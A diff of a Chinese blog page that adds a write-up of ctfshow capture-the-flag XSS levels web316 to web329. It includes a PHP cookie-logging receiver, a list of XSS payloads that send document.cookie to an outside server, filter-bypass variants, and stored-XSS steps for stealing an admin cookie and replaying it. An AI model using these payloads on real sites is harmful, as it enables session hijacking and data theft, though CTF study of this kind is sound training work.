@@ -146,7 +146,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="20">
-<input type="hidden" id="yelog_site_word_count" value="49.7k">
+<input type="hidden" id="yelog_site_word_count" value="50.9k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -473,12 +473,12 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-08-17 16:57:26'>2023-08-16 09:00</time>
+            发布时间 : <time class="date" title='最后更新: 2023-10-23 22:51:55'>2023-08-16 09:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:123</span>
+        <span>字数:881</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -497,7 +497,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web316"><span class="toc-text">web316</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web316"><span class="toc-text">web316</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web317"><span class="toc-text">web317</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web318-319"><span class="toc-text">web318~319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web320-321"><span class="toc-text">web320~321</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web322-326"><span class="toc-text">web322~326</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web327"><span class="toc-text">web327</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web328"><span class="toc-text">web328</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-329"><span class="toc-text">web 329</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -524,6 +524,83 @@
 <img src="/2023/08/16/xss(ctfshow)/165449.png" class="">
 
 <p>方式二：vps</p>
+<p>服务器可以起nc，可以用python起一个临时的服务器，也可以直接通过php自动接收脚本：</p>
+<p>在自己的服务器上放一个php代码：</p>
+<pre><code>&lt;?php
+$cookie = $_GET[&#39;cookie&#39;];
+$log = fopen(&quot;cookie.txt&quot;, &quot;a&quot;);
+fwrite($log, $cookie . &quot;\n&quot;);
+fclose($log);
+?&gt;
+</code></pre>
+<p>收集一下可用的姿势：</p>
+<pre><code>&lt;script&gt;
+var x=document.createElement(&quot;img&quot;); x.src=&quot;http://xxx/fff.php?cookie=&quot;+document.cookie;
+&lt;/script&gt;
+</code></pre>
+<pre><code>&lt;script&gt;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.cookie)&lt;/script&gt;
+</code></pre>
+<pre><code>&lt;script&gt;window.location.href=http://xxx/fff.php?cookie=&#39;+document.cookie&lt;/script&gt;
+</code></pre>
+<pre><code>&lt;script&gt;document.location.href=http://xxx/fff.php?cookie=&#39;+document.cookie&lt;/script&gt;
+</code></pre>
+<pre><code>&lt;script&gt;location.href=&#39;http://xxx/fff.php?cookie=&#39;+document.cookie&lt;/script&gt;
+</code></pre>
+<pre><code>&lt;input onfocus=&quot;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.cookie)&quot; autofocus&gt;
+</code></pre>
+<pre><code>&lt;svg onload=&quot;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.cookie)&quot;&gt;
+</code></pre>
+<pre><code>&lt;iframe onload=&quot;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;
+</code></pre>
+<pre><code>&lt;body onload=&quot;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.cookie)&quot;&gt;
+</code></pre>
+<p>更多姿势可以参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/340080.html">https://www.freebuf.com/articles/web/340080.html</a></p>
+<h3 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h3><p>应该是过滤了script，还有很多标签都可以用</p>
+<h3 id="web318-319"><a href="#web318-319" class="headerlink" title="web318~319"></a>web318~319</h3><p>过滤了img</p>
+<h3 id="web320-321"><a href="#web320-321" class="headerlink" title="web320~321"></a>web320~321</h3><p>过滤空格，可以用%09、tab、&#x2F;、&#x2F;**&#x2F;来绕过</p>
+<pre><code>&lt;svg/onload=&quot;window.open(&#39;http://47.113.199.107/fff.php?cookie=&#39;+document.cookie)&quot;&gt;
+</code></pre>
+<h3 id="web322-326"><a href="#web322-326" class="headerlink" title="web322~326"></a>web322~326</h3><p>过滤iframe，xss，空格，分号，逗号</p>
+<h3 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h3><p>存储型xss</p>
+<p>界面变成了这样</p>
+<img src="/2023/08/16/xss(ctfshow)/192459.png" class="">
+
+<p>一点就是收件人必须是admin才能发送成功，然后发件人和信的内容都填payload即可</p>
+<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><p>在用户管理处显示要 <code>admin</code> 权限，且显示会显示所有的用户名密码，说明所有的用户名密码会存储在某个地方，而这个地方就会触发xss</p>
+<p>这一关就是要通过xss获取到管理员的cookie</p>
+<p>有两种方法</p>
+<p>1、在自己的服务器上放一个php文件和js文件</p>
+<p>js-被加载到管理员页面</p>
+<pre><code>var img = new Image();
+img.src = &quot;http://your-domain/cookie.php?cookie=&quot;+document.cookie;
+document.body.append(img);
+</code></pre>
+<p>php就是和前面一样，接收js传来的cookie并保存</p>
+<p>注册处填入：</p>
+<pre><code>&lt;script src=http://your-domain/test.js&gt;&lt;/script&gt;
+</code></pre>
+<p>2、将cookie直接打到php</p>
+<pre><code>&lt;script&gt;location.href=&#39;http://ip/x.php?cookie=&#39;+document.cookie&lt;/script&gt;
+//这里不能用body标签，可以用script标签
+</code></pre>
+<p>接收到cookie：</p>
+
+
+<p>然后burp抓管理员页面的包，修改cookie</p>
+<img src="/2023/08/16/xss(ctfshow)/205158.png" class="">
+
+<p>然后一个一个放包，改cookie</p>
+<img src="/2023/08/16/xss(ctfshow)/205349.png" class="">
+
+<p>拿到flag:</p>
+<img src="/2023/08/16/xss(ctfshow)/205404.png" class="">
+
+<pre><code>因为页面框架获取和数据拉取填充是异步进行的，不在同一个数据包中，如果通过BURP完成此题，请注意数据包是否为获取指定数据。
+</code></pre>
+<p>或者可以直接在浏览器改一次cookie就行了</p>
+<h3 id="web-329"><a href="#web-329" class="headerlink" title="web 329"></a>web 329</h3><p>cookie设置了有效期，拿到cookie时就已经失效了，需要换个思路，既然可以通过运行js脚本拿到cookie，也可以拿到用户管理页面的内容，把flag带出来</p>
+<pre><code>&lt;script&gt;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;/script&gt;
+</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
